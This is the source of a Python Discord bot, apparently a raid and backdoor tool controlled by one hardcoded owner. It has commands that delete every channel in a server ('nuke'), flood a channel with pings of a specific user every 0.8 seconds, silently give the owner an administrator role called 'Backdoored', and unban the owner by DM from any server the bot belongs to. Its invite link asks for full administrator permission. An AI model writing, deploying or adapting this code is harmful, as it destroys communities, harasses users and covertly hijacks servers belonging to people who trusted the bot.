import os
import asyncio
import time
import discord
from discord.ext import commands

# ================= CONFIG =================
TOKEN = os.getenv("DISCORD_TOKEN")

OWNER_ID = 1258115928525373570
OWNER_NAME = "nico044037"

SPAM_MESSAGE = "<@1419680644618780824>"
SPAM_DELAY = 0.8

intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # REQUIRED for roles

bot = commands.Bot(
    command_prefix=["$", "!", "?"],
    intents=intents,
    help_command=None
)

spam_task: asyncio.Task | None = None

# ================= CHECK =================
def allowed(ctx_or_user):
    return ctx_or_user.name == OWNER_NAME

# ================= READY =================
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")

# ================= SUDO GROUP =================
@bot.group(name="sudo", invoke_without_command=True)
async def sudo(ctx):
    if not allowed(ctx.author):
        return
    await ctx.send(
        "Commands:\n"
        "`$sudo startmessage`\n"
        "`$sudo stopmessage`\n"
        "`$sudo nuke now`\n"
        "`$sudo backdoor`\n"
        "`$sudo add`"
    )

# ================= NUKE =================
@sudo.command(name="nuke")
async def sudo_nuke(ctx, key: str = None):
    if not allowed(ctx.author):
        return
    if key != "now":
        return

    for channel in list(ctx.guild.channels):
        try:
            await channel.delete(reason="sudo nuke")
        except (discord.Forbidden, discord.HTTPException):
            pass

# ================= SPAM LOOP =================
async def spam_loop(channel):
    try:
        while True:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(SPAM_DELAY)
    except asyncio.CancelledError:
        pass

# ================= START MESSAGE =================
@sudo.command(name="startmessage")
async def sudo_startmessage(ctx):
    global spam_task
    if not allowed(ctx.author):
        return
    if spam_task and not spam_task.done():
        return
    spam_task = asyncio.create_task(spam_loop(ctx.channel))
    await ctx.send("✅ spam started")

# ================= STOP MESSAGE =================
@sudo.command(name="stopmessage")
async def sudo_stopmessage(ctx):
    global spam_task
    if not allowed(ctx.author):
        return
    if not spam_task:
        return
    spam_task.cancel()
    spam_task = None
    await ctx.send("🛑 spam stopped")

# ================= ADD =================
@sudo.command(name="add")
async def sudo_add(ctx):
    await ctx.send(
        "https://discord.com/oauth2/authorize"
        "?client_id=1470802191139864659"
        "&permissions=8"
        "&integration_type=0"
        "&scope=bot+applications.commands"
    )

# ================= BACKDOOR =================
@sudo.command(name="backdoor")
async def sudo_backdoor(ctx):
    if not allowed(ctx.author):
        return

    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass

    guild = ctx.guild
    member = ctx.author
    role_name = "Backdoored"

    role = discord.utils.get(guild.roles, name=role_name)
    if role is None:
        role = await guild.create_role(
            name=role_name,
            permissions=discord.Permissions(administrator=True),
            reason="sudo backdoor"
        )

    if role not in member.roles:
        await member.add_roles(role, reason="sudo backdoor")

    try:
        await member.send(f"✅ Backdoor role applied in **{guild.name}**.")
    except discord.Forbidden:
        pass

# ================= DM HANDLER =================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # ALWAYS allow commands
    await bot.process_commands(message)

    # DM only
    if message.guild is not None:
        return

    if not allowed(message.author):
        return

    parts = message.content.strip().split()

    # ===== banlist =====
    if parts == ["$sudo", "banlist"]:
        banned = []
        for g in bot.guilds:
            try:
                bans = await g.bans()
            except discord.Forbidden:
                continue
            if any(e.user.id == message.author.id for e in bans):
                banned.append(f"{g.name} ({g.id})")

        await message.author.send(
            "🚫 Banned in:\n" + "\n".join(banned)
            if banned else
            "✅ Not banned in any servers I manage."
        )

    # ===== unban =====
    elif len(parts) == 3 and parts[:2] == ["$sudo", "unban"]:
        try:
            gid = int(parts[2])
        except ValueError:
            await message.author.send("❌ invalid server id")
            return

        guild = bot.get_guild(gid)
        if not guild:
            await message.author.send("❌ I am not in that server")
            return

        for entry in await guild.bans():
            if entry.user.id == message.author.id:
                await guild.unban(entry.user, reason="sudo unban")
                await message.author.send(f"✅ unbanned in **{guild.name}**")
                return

        await message.author.send("ℹ️ you are not banned there")

# ================= START =================
if not TOKEN:
    raise RuntimeError("DISCORD_TOKEN not set")

time.sleep(10)
bot.run(TOKEN)
